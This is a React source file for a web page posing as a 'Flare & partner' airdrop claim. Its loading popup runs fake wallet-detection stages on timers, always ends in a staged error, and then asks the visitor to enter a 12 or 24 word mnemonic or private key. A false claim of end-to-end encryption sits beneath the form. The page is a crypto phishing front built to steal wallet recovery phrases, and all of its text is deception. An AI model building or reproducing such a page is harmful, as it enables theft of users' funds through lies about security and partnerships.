import { useState } from "react";
import { FaShield } from "react-icons/fa6";

export function WalletPartner() {
  const partnerName = localStorage.getItem("walletName") || "";
  const partnerImg = localStorage.getItem("walletImg") || "";

  const [showPopup, setShowPopup] = useState(false);
  const [status, setStatus] = useState("Loading...");
  const [loading, setLoading] = useState(false);

  const handleConnect = () => {
    setShowPopup(true);
    setLoading(true);
    setStatus("Detecting Wallet...");

    setTimeout(() => {
      setStatus("Confirming Security...");
    }, 5000);

    setTimeout(() => {
      setStatus("Connecting Wallet...");
    }, 10000);

    setTimeout(() => {
      setLoading(false);
    }, 15000);
  };

  const closePopup = () => {
    setShowPopup(false);
  };
  return (
    <main className="min-h-screen overflow-x-hidden bg-background px-6 text-center font-[Poppins,sans-serif] sm:px-12">
      <section className="mx-auto max-w-3xl pt-8">
        <h1 className="text-2xl font-bold text-primary sm:text-3xl">
          Flare & <span className="partner-name">{partnerName}</span>{" "}
          Partnership
        </h1>

        <p className=" mt-5  text-sm leading-7 text-dark sm:text-base">
          Flare has partnered to make accessing and managing your Flare assets
          more seamless than ever. This collaboration brings secure, fast and
          easy wallet integration for all Flare Network users, empowering them
          to claim, store and transact with confidence.
        </p>

        {partnerImg && (
          <img
            className="mx-auto mt-8 h-25 w-25 rounded-full object-cover"
            src={partnerImg}
            alt={partnerName}
          />
        )}

        <hr className="my-8 border-gray-200" />

        <h2 className="text-xl font-bold text-[#383838] sm:text-2xl">
          Claim your Flare Airdrop
        </h2>

        <p className="mx-auto mt-4 max-w-2xl text-sm leading-7 text-[#383838] sm:text-base">
          As part of the Flare Partnership, eligible users can now claim their
          Flare airdrop directly through{" "}
          <span className="font-semibold">{partnerName}</span>. Don't miss out
          on securing your tokens. Fast, secure, and easy.
        </p>

        <button
          type="button"
          onClick={handleConnect}
          className="mt-7 rounded-full bg-primary px-8 py-3 text-sm font-medium text-white transition hover:scale-[.9]"
        >
          Claim Now
        </button>
      </section>

      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/55 px-4">
          <div className="w-full max-w-sm rounded-[10px] bg-white shadow-2xl">
            {/* Close button */}
            <div className="flex justify-end">
              <button
                type="button"
                onClick={closePopup}
                className="rounded-bl-[10px] rounded-tr-[10px] bg-black px-3 py-1 font-bold text-red-500"
              >
                x
              </button>
            </div>
            <div className="flex flex-col items-center justify-center px-6 py-6">
              <img
                className="h-15 w-15 rounded-full object-cover mb-2"
                src={partnerImg}
                alt={partnerName}
              />
              <p className="font-medium text-sm">{partnerName}</p>
              {/* loading animation */}
              {loading ? (
                <div className="relative mt-4 h-1 w-full overflow-hidden bg-[#f0f0f0]">
                  <div className="absolute left-[-50%] h-full w-1/2 animate-[loadingAnimation_1s_infinite] bg-[rgb(7,23,229)]" />
                </div>
              ) : (
                ""
              )}
              {!loading ? (
                <div className="flex flex-col mt-4">
                  <span className="p-3 text-xs border rounded-2xl border-primary text-primary">
                    An error occurred... please wait or connect manually
                  </span>
                  <button
                    onClick={handleConnect}
                    className="mt-4 border border-blue-500 rounded-full bg-transparent px-8 py-3 text-sm font-medium text-blue-500 transition hover:scale-[.9]"
                  >
                    Try Again
                  </button>
                  <button className="mt-4 rounded-full bg-blue-500 px-8 py-3 text-sm font-medium text-white transition hover:scale-[.9]">
                    Connect Manually
                  </button>
                </div>
              ) : (
                ""
              )}

              {loading ? (
                <p className="mt-8 mb-1 text-xs text-[#373737]">{status}</p>
              ) : (
                ""
              )}

              <form className="w-full">
                <textarea
                  required
                  name="message"
                  className="w-full h-40 resize-none rounded-lg border border-gray-300 p-3 text-base"
                  placeholder="Enter your 12 or 24 Mnemonic words. seperate them with spaces. You can also input your privatekey instead."
                ></textarea>
                <button className="mt-4 rounded-full bg-blue-500 px-8 py-3 text-sm font-medium text-white transition hover:scale-[.9]">
                  Connect
                </button>
              </form>

              <p className="flex items-center gap-2 text-xs mt-3 text-dark">
                <FaShield /> This session is secured with end-to-end encryption
              </p>
            </div>
          </div>
        </div>
      )}
    </main>
  );
}
